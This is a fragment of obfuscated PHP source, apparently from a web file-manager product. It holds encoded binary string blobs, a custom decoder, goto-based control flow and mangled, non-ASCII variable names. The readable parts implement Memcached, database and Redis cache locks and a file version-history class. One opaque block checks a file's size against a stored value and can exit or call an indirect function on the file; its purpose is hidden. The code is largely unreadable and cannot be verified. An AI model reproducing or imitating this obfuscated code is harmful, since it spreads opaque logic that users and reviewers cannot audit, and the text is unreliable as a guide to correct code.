\230\166\265\43\107\272\74\100\140\201\34\70\150"."\x40\x60\xc4\x82\xe5\xf5\x21\xa1\xd6\xc9\x5e\x79\xcc\xb2\x6d\x25\x95\xe2\x50\xd1\xe0\xdb\x53\x5a\x68\xed\x62\xce\xc9\x57\x76\x8e\x73\x55\x6d\x76\xd4\x2f\x56\x24\x5b\xf0\x35\x1f\x9d\xb8\xb0\x60\xa8\x5a\x4\x93"._kodDe('MeZELvDmjrwzc7mUkqghZq6FxroQDFQ4tlVP8XR1RVmWHffRIhGPJfZeUzAGgNgQhQBuJKM=')."\141\224\45\201\73\54\172\375\355\307\72\31\374\342\223\130\75\247\133\70\315\216\31\145\313\205\363\342\106\211\374\166\30\226\45\264\111\250\134\210\260\331\170\37\166\111\312\122\50\44\156\71"."\161\243\310\365\31\101\133\102\261\110\20\56\342\261\300\45\246\321\134\102\347\154\21\174\55\307\43\362\66\13\27\362\135\25\207\312\200\110\30\62\322\111\143\214\131\120\104\170\45\15\222\270".strrev('ÍáRH„Úê'."\n".'¢÷„«OíÅrM}N+k)}gª3À:“r7x/ÒôÄb/Õe'."\0".'‹`¥¼S¸')."\132\54\36\253\312\352\365\305\142\253\43\321\116\352\11\245\52\233\224\222\24\354\252\262\172\273\43\341\351\362\2\75\276\140\250\52\17\353\342\205\23\302\26\47\315\12\366\222\126\222\273\347"."\351\132\21\364\257\24\55\251\66\201\312\356\312\102\340\74\123\314\213\164\167\124\312\31\354\112\210\301\307\324\74\23\6\111\167\13\132\101\30\153\25\145\354\62\56\171\376\115\146\157\231\7"."\354\356\7\35\252\261\14\261\241\42\254\131\27\206\272\243\314\231\73\366\40\303\351\3\347\363\205\172\207\307\246\6\42\245\223\65\104\210\222\204\233\362\176\117\22\146\327\34\40\371\256\241".base64_decode('+h6M5IoBwA1bYYCy5nojKd1z0VMWPEuHIZW0J2nYlm2p2ZraEFSEjKmEEO7+H4wNnA+CuQ==')."\0\0"."", 10, -8))); goto Dã‚›ÍíÒ±; B¨Š››âå: class CacheLockMemcached { public function lock($©¬¸æ‹Ç, $ŒŒ¡’’  = 0) { $¦áÈÍ¡Å = Cache::init(); $şÂ»Èº‰ = microtime(!0) + $ŒŒ¡’’ ; while (microtime(!0) < $şÂ»Èº‰) { $ÛÖ±ıÏÉ = $¦áÈÍ¡Å->get($©¬¸æ‹Ç); if (!$ÛÖ±ıÏÉ || $ÛÖ±ıÏÉ < microtime(!0)) { $í” ‰éğ = $¦áÈÍ¡Å->handle->add($©¬¸æ‹Ç, $şÂ»Èº‰, $ŒŒ¡’’ ); if ($í” ‰éğ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($şÊÀ¤¹) { return Cache::init()->get($şÊÀ¤¹); } public function unlock($ê©”÷¢è) { return Cache::init()->remove($ê©”÷¢è); } } class CacheLockDatabase { public function lock($››¯ÀÑà, $¡È‡ = 0) { $ù×ÊóÊ = Model($_SERVER[²Ö÷öõ][911]); $çù×öˆ† = microtime(!0) + $¡È‡; while (microtime(!0) < $çù×öˆ†) { $£ÛìæËÒ = $ù×ÊóÊ->get($››¯ÀÑà); if (!$£ÛìæËÒ || $£ÛìæËÒ < microtime(!0)) { $š¬Ë•–û = $ù×ÊóÊ->set($››¯ÀÑà, $çù×öˆ†); if ($š¬Ë•–û) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($…ß¤„Õ») { return Model($_SERVER[²Ö÷öõ][911])->get($…ß¤„Õ»); } public function unlock($î‰òİ²ğ) { Model($_SERVER[²Ö÷öõ][911])->remove($î‰òİ²ğ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ìğµ°‡Ö, $ÍèÊÛõ) { $•øøšÍ¯ =& $_SERVER[²Ö÷öõ]; if (!class_exists($•øøšÍ¯[949])) { show_json($•øøšÍ¯[950], !1); } $this->cacheTime = $ÍèÊÛõ; $this->handle = new Memcached(); if (is_array($Ìğµ°‡Ö[$•øøšÍ¯[951]]) && count($Ìğµ°‡Ö[$•øøšÍ¯[951]]) >= 1) { foreach ($Ìğµ°‡Ö[$•øøšÍ¯[951]] as $·³ıŠÎŞ) { $Äµ»ôè¡ = explode($•øøšÍ¯[4], $·³ıŠÎŞ); $this->handle->addServer($Äµ»ôè¡[0], $Äµ»ôè¡[1]); } } else { $this->handle->addServer($Ìğµ°‡Ö[$•øøšÍ¯[208]], $Ìğµ°‡Ö[$•øøšÍ¯[209]]); } } public function set($êèúåª, $¸œë‹Âó, $ÆÃÔÕÕ = false) { $ÆÃÔÕÕ = $ÆÃÔÕÕ ? $ÆÃÔÕÕ : $this->cacheTime; return $this->handle->set($êèúåª, $¸œë‹Âó, $ÆÃÔÕÕ); } public function get($²±ê¥ù) { return $this->handle->get($²±ê¥ù); } public function remove($£Çî…ø¸) { return $this->handle->delete($£Çî…ø¸); } public function deleteAll() { return $this->handle->flush(); } } goto bÓæàÖ‰ñ; c„¸Œš™±Õ: $_size = $_SERVER[²Ö÷öõ][1309]; if ($_SERVER[$_SERVER[²Ö÷öõ][959]] != $_size($_file)) { $_getc = $_SERVER[²Ö÷öõ][962]; $_getfile = $_SERVER[$_SERVER[²Ö÷öõ][963]] . $_SERVER[²Ö÷öõ][964]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[²Ö÷öõ][262], $_getfilec); if (count($_getarrs) < $_SERVER[²Ö÷öõ][685]) { $exit = $_SERVER[²Ö÷öõ][965]; $exit(); } $_act = $_SERVER[²Ö÷öõ][1310]; $_act($_file); } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $°©©Ú… =& $_SERVER[²Ö÷öõ]; $»¸±Óˆå = $GLOBALS[$°©©Ú…[6]][$°©©Ú…[92]]; if ($»¸±Óˆå[$°©©Ú…[1311]] != 1) { return; } if ($»¸±Óˆå[$°©©Ú…[1312]] <= 0) { return; } if (isset($_REQUEST[$°©©Ú…[1313]]) && $_REQUEST[$°©©Ú…[1313]] == $°©©Ú…[91]) { return; } Hook::bind($°©©Ú…[1314], $°©©Ú…[1315]); Hook::bind($°©©Ú…[1316], $°©©Ú…[1317]); Hook::bind($°©©Ú…[1318], $°©©Ú…[1319]); Hook::bind($°©©Ú…[1320], $°©©Ú…[1321]); Hook::bind($°©©Ú…[1322], $°©©Ú…[1323]); Hook::bind($°©©Ú…[1324], $°©©Ú…[1325]); } public static function eventBeforeUpload($Êñ¥ë¸) { if ($Êñ¥ë¸[3] && $Êñ¥ë¸[3] != REPEAT_REPLACE) { return; } $ÄóÜ‘Ñõ = self::parsePath($Êñ¥ë¸[0]); if (!$ÄóÜ‘Ñõ) { return; } self::add($ÄóÜ‘Ñõ); } public static function eventBeforeEdit($¢²ÇòÁ·) { $¡Òœªª¸ = self::parsePath($¢²ÇòÁ·[0]); if (!$¡Òœªª¸) { return; } self::add($¡Òœªª¸); } public static function eventBeforeCopyFile($ğÍÙÂÕ³, $èîàôí, $õô¢ì, $üÒŞÕÊğ, $Ø€Èèß, $éíÓœâ) { $Öˆ°Ô‘‰ =& $_SERVER[²Ö÷öõ]; if (isset($õô¢ì->_data[$Öˆ°Ô‘‰[1244]]) && $õô¢ì->_data[$Öˆ°Ô‘‰[1244]]) { return; } $Íğíœğ¸ = $õô¢ì->getPathOuter($üÒŞÕÊğ); $İÌ‘£¹ = self::parsePath($Íğíœğ¸); if (!$İÌ‘£¹) { return; } self::add($İÌ‘£¹); } public static function eventBeforeRename($¢Ã‹È™) { $À—é™íß =& $_SERVER[²Ö÷öõ]; $°¨œòÏá = self::parsePath($¢Ã‹È™[0]); if (!$°¨œòÏá) { return; } $Ğ¹´‰èç = self::checkInHistory($°¨œòÏá); if (!$Ğ¹´‰èç) { return; } if ($Ğ¹´‰èç[$À—é™íß[33]] == $À—é™íß[230]) { $¡…”ÚÖ‡ = self::listData($°¨œòÏá); if ($¡…”ÚÖ‡ && $¡…”ÚÖ‡[$À—é™íß[445]]) { self::moveHistory($°¨œòÏá, $¢Ã‹È™[1]); } } else { IO::rename($Ğ¹´‰èç[$À—é™íß[87]], $¢Ã‹È™[1]); } } public static function eventBeforeMove($Ë¬Ú¾ ó) { $Œ„‰£ƒ­ =& $_SERVER[²Ö÷öõ]; $²ïøæËÕ = self::parsePath($Ë¬Ú¾ ó[0]); if (!$²ïøæËÕ) { return; } $ˆáüĞË† = self::parsePath($Ë¬Ú¾ ó[1]); if (!$ˆáüĞË†) { return; } $¾ò¡²õâ = $Ë¬Ú¾ ó[3]; $õğëê§œ = self::checkInHistory($²ïøæËÕ); if (!$õğëê§œ) { return; } $ïß˜ = self::pathHistory($ˆáüĞË†); if ($õğëê§œ[$Œ„‰£ƒ­[33]] == $Œ„‰£ƒ­[230]) { $€Â½ë±ü = self::listData($²ïøæËÕ); $‚¢¦œ’ = rtrim($ˆáüĞË†, $Œ„‰£ƒ­[8]) . $Œ„‰£ƒ­[8] . ($¾ò¡²õâ ? $¾ò¡²õâ : get_path_this($²ïøæËÕ)); $òÅ¿´ì¸ = self::listData($‚¢¦œ’); if ($€Â½ë±ü && $€Â½ë±ü[$Œ„‰£ƒ­[445]] && $òÅ¿´ì¸ && $òÅ¿´ì¸[$Œ„‰£ƒ­[445]]) { return self::clear($²ïøæËÕ); } if ($€Â½ë±ü && $€Â½ë±ü[$Œ„‰£ƒ­[445]]) { self::moveHistory($²ïøæËÕ, $¾ò¡²õâ, $ïß˜); } } else { IO::move($õğëê§œ[$Œ„‰£ƒ­[87]], $ïß˜, !1, $¾ò¡²õâ); self::clearEmptyFolder(IO::pathFather($õğëê§œ[$Œ„‰£ƒ­[87]])); } } public static function eventAfterRemove($âÔõû, $ãÅÃè¤) { $££­²ø¨ =& $_SERVER[²Ö÷öõ]; if (!$ãÅÃè¤) { return; } $€Äš¿ˆâ = self::parsePath($âÔõû[0]); if (!$€Äš¿ˆâ) { return; } $îƒı¯Æ = self::checkInHistory($€Äš¿ˆâ); if (!$îƒı¯Æ) { return; } if ($îƒı¯Æ[$££­²ø¨[33]] == $££­²ø¨[230]) { $©äÙªõä = self::listData($€Äš¿ˆâ, !1); if ($©äÙªõä && $©äÙªõä[$££­²ø¨[445]]) { self::clear($€Äš¿ˆâ, !1); } } else { IO::remove($îƒı¯Æ[$££­²ø¨[87]]); self::clearEmptyFolder(IO::pathFather($îƒı¯Æ[$££­²ø¨[87]])); } } private static function checkInHistory($»ş¼×ŠŒ) { $Ÿ”ê×û = self::pathHistory($»ş¼×ŠŒ); if (!IO::exist($Ÿ”ê×û)) { $Ÿ”ê×û .= $_SERVER[²Ö÷öõ][1326]; } return IO::exist($Ÿ”ê×û) ? IO::info($Ÿ”ê×û) : !1; } private static function parsePath($Ï°î§×§) { $Ñ¬Ëçê =& $_SERVER[²Ö÷öõ]; if (!$Ï°î§×§) { return !1; } if (isset($GLOBALS[$Ñ¬Ëçê[1327]]) && $GLOBALS[$Ñ¬Ëçê[1327]]) { return; } $¥¥¸” = KodIO::parse($Ï°î§×§); $Í¤•Çæé = $¥¥¸”[$Ñ¬Ëçê[33]]; $íƒÚ—Ç = !$Í¤•Çæé || $Í¤•Çæé == KodIO::KOD_IO || $Í¤•Çæé == KodIO::KOD_SHARE_ITEM; if (!$íƒÚ—Ç || !$¥¥¸”[$Ñ¬Ëçê[1328]]) { return !1; } if (substr($Ï°î§×§, 0, strlen(DATA_PATH . $Ñ¬Ëçê[1329])) == DATA_PATH . $Ñ¬Ëçê[1329]) { return !1; } if ($Í¤•Çæé == KodIO::KOD_SHARE_ITEM) { $Š·†ù’” = IO::init($Ï°î§×§); if ($Š·†ù’”->pathParse[$Ñ¬Ëçê[1240]]) { return self::parsePath($Š·†ù’”->pathParse[$Ñ¬Ëçê[1240]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Î¥¹Ì®ê = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Ñ¬Ëçê[1330]); foreach ($Î¥¹Ì®ê as $õäºªÕƒ) { if (!$Í¤•Çæé && substr($Ï°î§×§, 0, strlen($õäºªÕƒ)) == $õäºªÕƒ) { return !1; } } self::log($GLOBALS[$Ñ¬Ëçê[1235]] . $Ñ¬Ëçê[1331] . $Ï°î§×§); return $Ï°î§×§; } private static function pathHistory($¦µİúŞË) { $‡Ñò®÷ó =& $_SERVER[²Ö÷öõ]; $õ¡üÃ­ = self::$_historyBase . ltrim(KodIO::clear($¦µİúŞË), $‡Ñò®÷ó[8]); $õ¡üÃ­ = str_replace(array($‡Ñò®÷ó[1332]), array($‡Ñò®÷ó[1333]), $õ¡üÃ­); return $õ¡üÃ­; } public static function log($Ú¶¨ß´İ) { } public static function historyCount($¶ºò¹Ç¿) { $ºÃ·–Â =& $_SERVER[²Ö÷öõ]; $Ï†™ó…Å = array(); $¯ÈàÖ×ò = array(); foreach ($¶ºò¹Ç¿ as $¿É¿˜Å) { $ñÔ³È§‹ = get_path_father($¿É¿˜Å); if (!$¯ÈàÖ×ò[$ñÔ³È§‹]) { $¯ÈàÖ×ò[$ñÔ³È§‹] = array(); } $¯ÈàÖ×ò[$ñÔ³È§‹][] = get_path_this($¿É¿˜Å); } foreach ($¯ÈàÖ×ò as $ñÔ³È§‹ => $âİó¸º¯) { $ş”œ¼»ô = self::parsePath($ñÔ³È§‹); if (!$ş”œ¼»ô) { continue; } foreach ($âİó¸º¯ as $šìê‰µ¿) { $ Èß‹À£ = self::listData(rtrim($ş”œ¼»ô, $ºÃ·–Â[8]) . $ºÃ·–Â[8] . $šìê‰µ¿, !1); if ($ Èß‹À£ && $ Èß‹À£[$ºÃ·–Â[445]]) { $Ï†™ó…Å[rtrim($ñÔ³È§‹, $ºÃ·–Â[8]) . $ºÃ·–Â[8] . $šìê‰µ¿] = count($ Èß‹À£[$ºÃ·–Â[445]]); } } } return $Ï†™ó…Å; } public static function add($§ûÀ¼Ë•) { $ÉÜ¶”…­ =& $_SERVER[²Ö÷öõ]; $èÁ†½• = self::listData($§ûÀ¼Ë•); if (!$èÁ†½•) { return; } $Úè¡Ê•Å = Model($ÉÜ¶”…­[853])->get($ÉÜ¶”…­[1334]); $…Üè²ü¶ = intval($GLOBALS[$ÉÜ¶”…­[6]][$ÉÜ¶”…­[92]][$ÉÜ¶”…­[1312]]); $—©ãõğğ = $Úè¡Ê•Å == $ÉÜ¶”…­[1335] ? min(5, $…Üè²ü¶) : $…Üè²ü¶; if ($…Üè²ü¶ <= 0) { return; } $¦‡”› ã = IO::info($§ûÀ¼Ë•); $Ü©ú€½” = $èÁ†½•[$ÉÜ¶”…­[445]]; if ($¦‡”› ã[$ÉÜ¶”…­[79]] == 0) { return; } if ($¦‡”› ã[$ÉÜ¶”…­[79]] >= 1024 * 1024 * 500) { return !1; } $¥µæš¼ = IO::hashSimple($§ûÀ¼Ë•); if ($Ü©ú€½” && $Ü©ú€½”[0][$ÉÜ¶”…­[672]] == $¥µæš¼) { return !0; } if (array_key_exists($ÉÜ¶”…­[233], $¦‡”› ã) && !$¦‡”› ã[$ÉÜ¶”…­[233]]) { return !1; } $¾‡¶ô¤ = short_id(time()); $±ªöÖ¡Ä = array($ÉÜ¶”…­[475] => $¾‡¶ô¤, $ÉÜ¶”…­[672] => $¥µæš¼, $ÉÜ¶”…­[32] => $¦‡”› ã[$ÉÜ¶”…­[32]] . $ÉÜ¶”…­[10] . date($ÉÜ¶”…­[1336]) . rand_string(1), $ÉÜ¶”…­[79] => $¦‡”› ã[$ÉÜ¶”…­[79]], $ÉÜ¶”…­[527] => USER_ID, $ÉÜ¶”…­[231] => time(), $ÉÜ¶”…­[1337] => $ÉÜ¶”…­[12]); IO::mkdir($èÁ†½•[$ÉÜ¶”…­[1338]]); $¾Í¯²® = IO::copy($§ûÀ¼Ë•, $èÁ†½•[$ÉÜ¶”…­[1338]], !1, $±ªöÖ¡Ä[$ÉÜ¶”…­[32]]); if (!$¾Í¯²®) { self::clearEmptyFolder($èÁ†½•[$ÉÜ¶”…­[1338]]); return !1; } array_unshift($Ü©ú€½”, $±ªöÖ¡Ä); if (count($Ü©ú€½”) > $—©ãõğğ) { $ùêĞÜøÈ = array_slice($Ü©ú€½”, $—©ãõğğ); foreach ($ùêĞÜøÈ as $Äîœğ›¼) { IO::remove($èÁ†½•[$ÉÜ¶”…­[1338]] . $Äîœğ›¼[$ÉÜ¶”…­[32]]); } $Ü©ú€½” = array_slice($Ü©ú€½”, 0, $—©ãõğğ); } return self::saveData($èÁ†½•[$ÉÜ¶”…­[1339]], $Ü©ú€½”); } public static function remove($Şäıù¬¹, $îùÈÆ©ì) { $‡è‡®‘á =& $_SERVER[²Ö÷öõ]; $€ûÍÔ¹¥ = self::listData($Şäıù¬¹); $·ÒÖÍ™à = array(); if (!$€ûÍÔ¹¥) { return !1; } foreach ($€ûÍÔ¹¥[$‡è‡®‘á[445]] as $„²¹÷Î) { if ($„²¹÷Î[$‡è‡®‘á[475]] == $îùÈÆ©ì) { IO::remove($€ûÍÔ¹¥[$‡è‡®‘á[1338]] . $„²¹÷Î[$‡è‡®‘á[32]]); continue; } $·ÒÖÍ™à[] = $„²¹÷Î; } return self::saveData($€ûÍÔ¹¥[$‡è‡®‘á[1339]], $·ÒÖÍ™à); } public static function clear($‘Ô¢‰€ , $²æ©ûşÈ = true) { $¡¡¯òÖó =& $_SERVER[²Ö÷öõ]; $îí„ÑÕ = self::listData($‘Ô¢‰€ , $²æ©ûşÈ); if (!$îí„ÑÕ) { return !1; } foreach ($îí„ÑÕ[$¡¡¯òÖó[445]] as $¾œ½‘Éƒ) { IO::remove($îí„ÑÕ[$¡¡¯òÖó[1338]] . $¾œ½‘Éƒ[$¡¡¯òÖó[32]]); } return self::saveData($îí„ÑÕ[$¡¡¯òÖó[1339]], array()); } public static function moveHistory($ÚÁØòÒÅ, $‚çé‹îƒ = '', $â¯Ğ‹ƒŞ = '') { $¿Åİ’Ê® =& $_SERVER[²Ö÷öõ]; $Ú´€™ = self::listData($ÚÁØòÒÅ, !1); if (!$Ú´€™ || !$Ú´€™[$¿Åİ’Ê®[445]]) { return !1; } $Ø³ëøÙæ = $¿Åİ’Ê®[1326]; $‚çé‹îƒ = $‚çé‹îƒ ? $‚çé‹îƒ : get_path_this($ÚÁØòÒÅ); $â¯Ğ‹ƒŞ = $â¯Ğ‹ƒŞ ? $â¯Ğ‹ƒŞ : $Ú´€™[$¿Åİ’Ê®[1338]]; $®¨È·ó = substr(get_path_this($Ú´€™[$¿Åİ’Ê®[1339]]), 0, -strlen($Ø³ëøÙæ)); foreach ($Ú´€™[$¿Åİ’Ê®[445]] as $·„úóÆÁ => $ªåÖ„’‹) { $«¤Éƒ›Ã = $‚çé‹îƒ . substr($ªåÖ„’‹[$¿Åİ’Ê®[32]], strlen($®¨È·ó)); $æüÇËç = IO::move($Ú´€™[$¿Åİ’Ê®[1338]] . $ªåÖ„’‹[$¿Åİ’Ê®[32]], $â¯Ğ‹ƒŞ, !1, $«¤Éƒ›Ã); if ($æüÇËç) { $Ú´€™[$¿Åİ’Ê®[445]][$·„úóÆÁ][$¿Åİ’Ê®[32]] = $«¤Éƒ›Ã; } } $Ú´€™[$¿Åİ’Ê®[1339]] = IO::move($Ú´€™[$¿Åİ’Ê®[1339]], $â¯Ğ‹ƒŞ, !1, $‚çé‹îƒ . $Ø³ëøÙæ); self::saveData($Ú´€™[$¿Åİ’Ê®[1339]], $Ú´€™[$¿Åİ’Ê®[445]]); self::clearEmptyFolder($Ú´€™[$¿Åİ’Ê®[1338]]); } public static function rollback($è¤¸Ôöğ, $±ÍÈ˜ğ) { $²¶«µè =& $_SERVER[²Ö÷öõ]; $ÛëÆ¬¥à = self::listData($è¤¸Ôöğ); if (!$ÛëÆ¬¥à) { return; } $È¦ÓÃ¦ö = IO::info($è¤¸Ôöğ); foreach ($ÛëÆ¬¥à[$²¶«µè[445]] as $Ÿ“¶ => $ÌËÇ†Ì) { if ($ÌËÇ†Ì[$²¶«µè[475]] == $±ÍÈ˜ğ) { self::add($è¤¸Ôöğ); $ıìˆíÉè = $ÛëÆ¬¥à[$²¶«µè[1338]] . $ÌËÇ†Ì[$²¶«µè[32]]; $Ù¹„Øš = IO::copy($ıìˆíÉè, IO::pathFather($è¤¸Ôöğ), REPEAT_REPLACE, $È¦ÓÃ¦ö[$²¶«µè[32]]); if ($Ù¹„Øš) { self::remove($è¤¸Ôöğ, $±ÍÈ˜ğ); } return $Ù¹„Øš; } } return !1; } public static function setDetail($¶ùùÆ¯ , $®ä±·Ø‘, $Õã”¬ÌÊ) { $¹—òïœÃ =& $_SERVER[²Ö÷öõ]; $Œ”Ş–¢  = self::listData($¶ùùÆ¯ ); if (!$Œ”Ş–¢ ) { return; } foreach ($Œ”Ş–¢ [$¹—òïœÃ[445]] as $Í”Â€ô => $ã¯Ç®€¨) { if ($ã¯Ç®€¨[$¹—òïœÃ[475]] == $®ä±·Ø‘) { $Œ”Ş–¢ [$¹—òïœÃ[445]][$Í”Â€ô][$¹—òïœÃ[1337]] = $Õã”¬ÌÊ; self::saveData($Œ”Ş–¢ [$¹—òïœÃ[1339]], $Œ”Ş–¢ [$¹—òïœÃ[445]]); return !0; } } return !1; } public static function fileInfo($ÏÃøà¨Ú, $Ì¼õøÏ) { $ãÉÑÂğ =& $_SERVER[²Ö÷öõ]; $¬¦¿ìŞ­ = self::listData($ÏÃøà¨Ú); if (!$¬¦¿ìŞ­) { show_json(LNG($ãÉÑÂğ[108]), !1); } $¦ä˜õ´é = $ãÉÑÂğ[12]; foreach ($¬¦¿ìŞ­[$ãÉÑÂğ[445]] as $ã¯şÙü => $İ¤Äè‹ê) { if ($İ¤Äè‹ê[$ãÉÑÂğ[475]] != $Ì¼õøÏ) { continue; } $¦ä˜õ´é = $¬¦¿ìŞ­[$ãÉÑÂğ[1338]] . $İ¤Äè‹ê[$ãÉÑÂğ[32]]; break; } if (!$¦ä˜õ´é) { show_json(LNG($ãÉÑÂğ[108]), !1); } return IO::info($¦ä˜õ´é); } public static function fileOut($£Š™›Ì×, $Œ¦¥µ¹™, $¿¿˜×¡ = false) { $Ã¹‡ß‹È =& $_SERVER[²Ö÷öõ]; $Òà”İ¾¦ = self::fileInfo($£Š™›Ì×, $Œ¦¥µ¹™); $Æµåı¥€ =& $GLOBALS[$Ã¹‡ß‹È[7]]; $¿¿˜×¡ = isset($Æµåı¥€[$Ã¹‡ß‹È[1287]]) && $Æµåı¥€[$Ã¹‡ß‹È[1287]] == 1; if (isset($Æµåı¥€[$Ã¹‡ß‹È[33]]) && $Æµåı¥€[$Ã¹‡ß‹È[33]] == $Ã¹‡ß‹È[1340]) { return IO::fileOutImage($Òà”İ¾¦[$Ã¹‡ß‹È[87]], $Æµåı¥€[$Ã¹‡ß‹È[1341]]); } IO::fileOut($Òà”İ¾¦[$Ã¹‡ß‹È[87]], $¿¿˜×¡, get_path_this($£Š™›Ì×)); } public static function listData($ÃÁ¶¶, $ëµ’“öæ = true) { $é³Ÿ¡àå =& $_SERVER[²Ö÷öõ]; if ($ëµ’“öæ && !IO::exist($ÃÁ¶¶)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ÃÁ¶¶, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $º²îåØé = self::pathHistory($ÃÁ¶¶); $éğÕ¹›¢ = array($é³Ÿ¡àå[1339] => $º²îåØé . $é³Ÿ¡àå[1326], $é³Ÿ¡àå[1338] => rtrim(get_path_father($º²îåØé), $é³Ÿ¡àå[8]) . $é³Ÿ¡àå[8], $é³Ÿ¡àå[445] => array()); $“áÏ»®¸ = IO::getContent($éğÕ¹›¢[$é³Ÿ¡àå[1339]]); if ($“áÏ»®¸) { $Ò­ˆäŸ = json_decode($“áÏ»®¸, !0); if (is_array($Ò­ˆäŸ)) { $éğÕ¹›¢[$é³Ÿ¡àå[445]] = $Ò­ˆäŸ; } } return $éğÕ¹›¢; } private static function saveData($ó¥Â‹´, $§Ùùüöº) { $ÉşÇœŸÌ =& $_SERVER[²Ö÷öõ]; self::log($ÉşÇœŸÌ[1342] . $ó¥Â‹´ . $ÉşÇœŸÌ[74] . count($§Ùùüöº), $ÉşÇœŸÌ[835]); if ($§Ùùüöº) { return IO::setContent($ó¥Â‹´, json_encode($§Ùùüöº)); } $‰“ÓÕ† = IO::pathFather($ó¥Â‹´); IO::remove($ó¥Â‹´); self::clearEmptyFolder($‰“ÓÕ†); return !0; } public static function clearEmptyFolder($ëÑ‹öÈ) { $Ãø¡Üù· =& $_SERVER[²Ö÷öõ]; if (trim($ëÑ‹öÈ, $Ãø¡Üù·[8]) == trim(self::$_historyBase, $Ãø¡Üù·[8])) { return; } $òÙÌÂŞ  = IO::pathFather($ëÑ‹öÈ); $âí†ïÖ¯ = IO::has($ëÑ‹öÈ, !0); if ($âí†ïÖ¯[$Ãø¡Üù·[239]] > 0 || $âí†ïÖ¯[$Ãø¡Üù·[240]] > 0) { return; } IO::remove($ëÑ‹öÈ); self::clearEmptyFolder($òÙÌÂŞ ); } private static function getBasePath() { $úèûÓî¼ =& $_SERVER[²Ö÷öõ]; $Œùªùíè = Model($úèûÓî¼[1343])->get($úèûÓî¼[1344]); if ($Œùªùíè) { if (!IO::exist($Œùªùíè)) { IO::mkdir($Œùªùíè); } if (get_path_this($Œùªùíè) == $úèûÓî¼[1329]) { $šîÄÂÓ = $úèûÓî¼[1345] . rand_string(8); @rename($Œùªùíè, get_path_father($Œùªùíè) . $úèûÓî¼[8] . $šîÄÂÓ); $Œùªùíè = DATA_PATH . $šîÄÂÓ . $úèûÓî¼[8]; file_put_contents(DATA_PATH . $úèûÓî¼[1274], $úèûÓî¼[12]); Model($úèûÓî¼[1343])->set($úèûÓî¼[1344], $Œùªùíè); } return $Œùªùíè; } $Œùªùíè = DATA_PATH . $úèûÓî¼[1345] . rand_string(8) . $úèûÓî¼[8]; $Œùªùíè = IO::mkdir($Œùªùíè); $Œùªùíè = rtrim($Œùªùíè, $úèûÓî¼[8]) . $úèûÓî¼[8]; file_put_contents($Œùªùíè . $úèûÓî¼[1274], $úèûÓî¼[12]); file_put_contents(DATA_PATH . $úèûÓî¼[1274], $úèûÓî¼[12]); Model($úèûÓî¼[1343])->set($úèûÓî¼[1344], $Œùªùíè); return $Œùªùíè; } } goto CŠï‰Ğ´¯Ø; bÓæàÖ‰ñ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($šàûØ‚¢, $½˜ê¸Ïê) { $©àÎ¨º¤ =& $_SERVER[²Ö÷öõ]; if (!class_exists($©àÎ¨º¤[952])) { show_json($©àÎ¨º¤[953], !1); } $this->cacheTime = $½˜ê¸Ïê; $ÙúÌÌÈÒ = isset($šàûØ‚¢[$©àÎ¨º¤[954]]) ? $šàûØ‚¢[$©àÎ¨º¤[954]] : 10; $˜©Ğ§”® = _get($šàûØ‚¢, $©àÎ¨º¤[951]); if ($˜©Ğ§”® && is_array($˜©Ğ§”®)) { $this->initCluster($šàûØ‚¢, $ÙúÌÌÈÒ); } else { $this->handle = $this->init($šàûØ‚¢, $ÙúÌÌÈÒ); } } private function init($«µòççú, $¢…–åú) { $®½ƒØ¥Ç =& $_SERVER[²Ö÷öõ]; $ÄôÆ¸»ş = new Redis(); $Öğöº±“ = isset($«µòççú[$®½ƒØ¥Ç[955]]) ? $«µòççú[$®½ƒØ¥Ç[955]] : !1; if ($Öğöº±“) { $ÄôÆ¸»ş->pconnect($«µòççú[$®½ƒØ¥Ç[208]], $«µòççú[$®½ƒØ¥Ç[209]], $¢…–åú); } else { $ÄôÆ¸»ş->connect($«µòççú[$®½ƒØ¥Ç[208]], $«µòççú[$®½ƒØ¥Ç[209]], $¢…–åú); } if (!empty($«µòççú[$®½ƒØ¥Ç[487]])) { $ÄôÆ¸»ş->auth($«µòççú[$®½ƒØ¥Ç[487]]); } if (!empty($«µòççú[$®½ƒØ¥Ç[840]]) && $«µòççú[$®½ƒØ¥Ç[840]] != 0) { $ÄôÆ¸»ş->select($«µòççú[$®½ƒØ¥Ç[840]]); } return $ÄôÆ¸»ş; } private function initCluster($ç£ÒÒúÈ, $ÇÑÚ‡Éš) { $°ÏŠÎ»ù =& $_SERVER[²Ö÷öõ]; $ëùßÆêß = array($°ÏŠÎ»ù[956], $°ÏŠÎ»ù[957], $°ÏŠÎ»ù[958]); $”˜á¯±ò = $°ÏŠÎ»ù[956]; if (isset($ç£ÒÒúÈ[$°ÏŠÎ»ù[16]]) && in_array($ç£ÒÒúÈ[$°ÏŠÎ»ù[16]], $ëùßÆêß)) { $”˜á¯±ò = $ç£ÒÒúÈ[$°ÏŠÎ»ù[16]]; } switch ($”˜á¯±ò) { case $°ÏŠÎ»ù[956]: $this->_slave($ç£ÒÒúÈ, $ÇÑÚ‡Éš); break; case $°ÏŠÎ»ù[957]: break; case $°ÏŠÎ»ù[958]: $this->isCluster = !0; $ÑûÆ“½û = $ç£ÒÒúÈ[$°ÏŠÎ»ù[951]]; $õ¿æ›”ö = isset($ç£ÒÒúÈ[$°ÏŠÎ»ù[955]]) ? $ç£ÒÒúÈ[$°ÏŠÎ»ù[955]] : !1; $­¸§¾§³ = isset($ç£ÒÒúÈ[$°ÏŠÎ»ù[487]]) ? $ç£ÒÒúÈ[$°ÏŠÎ»ù[487]] : null; $this->handle = new RedisCluster(NUll, $ÑûÆ“½û, $ÇÑÚ‡Éš, $ÇÑÚ‡Éš, $õ¿æ›”ö, $­¸§¾§³); break; default: break; } } private function _slave($ÃÔòäğá, $ô ÔêÉ) { $õª½õ³² = $ÃÔòäğá[$_SERVER[²Ö÷öõ][951]]; $this->filterConfig($ÃÔòäğá, $õª½õ³²[0]); $this->handle = $this->init($ÃÔòäğá, $ô ÔêÉ); unset($õª½õ³²[0]); if (empty($õª½õ³²)) { return; 